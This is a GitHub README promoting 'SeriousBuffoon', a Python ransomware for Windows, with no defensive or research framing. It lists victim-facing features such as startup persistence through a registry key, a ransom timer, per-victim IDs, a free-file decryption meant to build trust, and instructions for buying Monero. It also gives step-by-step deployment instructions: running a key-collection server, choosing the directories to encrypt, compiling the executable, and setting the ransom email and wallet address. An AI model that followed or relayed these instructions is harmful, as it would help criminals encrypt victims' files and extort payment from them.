⚡⚡ SeriousBuffoon ⚡⚡ 


<img src="https://github.com/Chibraax/SeriousBuf00n/blob/main/Bin/GUI/images/joker.png" alt="Serious Buffoon" width="300" height="200">

Probably the best Python ransomware available on Github

 

< Features of SeriousBuffoon > 

	+> 32 bits encryption key
	+> Multi threaded encryption/decryption
	+> Encrypt big files chunk by chunk (test on a 36 GB file)
	+> Can adapt depending of the processor
	+> Send decryption key through TLS
	+> Awesome GUI write with Tkinter with useful options
	+> Unique ID for each victim 
	+> Victim can decrypt one file for free, to create a relationship of trust with the user 
	+> The decryption key for the free file is different from the rest of files
	+> Change the wallpapper and get back the old one after the decryption
	+> GUI with Timer
	+> Easily customisable because with "const.py"
	+> Create register KEY for launch the ransomware at every start up
	+> Clean itself, the ransomware delete all files after the decryption
	+> Tell the user how to buy moneros 
	+> Works on Windows 10 and Windows 11


GUI : 

<img src="https://github.com/Chibraax/SeriousBuf00n/blob/main/Screenshot/1.png" alt="Serious Buffoon" width="600" height="400">




< How to use SeriousBuffoon as .exe > 

[-] Python 3.12.1+

[-] Set up the server: 

	+> Execute the "auto_cert_gen.sh" file for generate your certificate and key
	+> Edit server.py and the variables "keyfile" and "certificate" by setting the path of these files
	+> Edit your IP and PORT 
	+> Run the server by taping python3 server.py . (Maybe you will need to install termcolor (pip3 install termcolor))

[-] Set up the virtual environment and install all the required packages. 

	Step 1 : cd SeriousBuffoon/Bin
	Step 2 : py -m venv .venv
	Step 3 : activate the virtual env by taping :".\.venv\Scripts\activate" 
	Step 4 : install of packages by taping : pip3 install -r ..\ressource\requierements.txt
	Step 5 : Edit the const.py file and the variable : "DIR_TO_HIT" to set where SeriousBuffoon should encrypt
	Step 6 : Edit the const.py file and the variable : HOST,PORT to set your server and port
	Step 7 : Compile the ransomware by type : pyinstaller build.spec
	Step 8 : you will find the .exe in "dist" folder
	Step 9 : Enjoy <3



[-] If when you try to change the .ico of the .exe it's not working :

	- Try to just cut the file and past it to another dir
	- Go to C:\Users\User\AppData\Local\Microsoft\Windows\Explorer. Select all files that begin with iconcache and thumbcache and delete all these files
	- Go to C:\Users\user\AppData\Local and delete IconCache.db


[-] In production dont forget to edit the EMAIL and MONERO_ADDRESS in const.py.
[-] Add some files extensions on encryption/encrypt.py line 26.
[-] You can modify the build.spec if you want change the behaviour of the ransomware
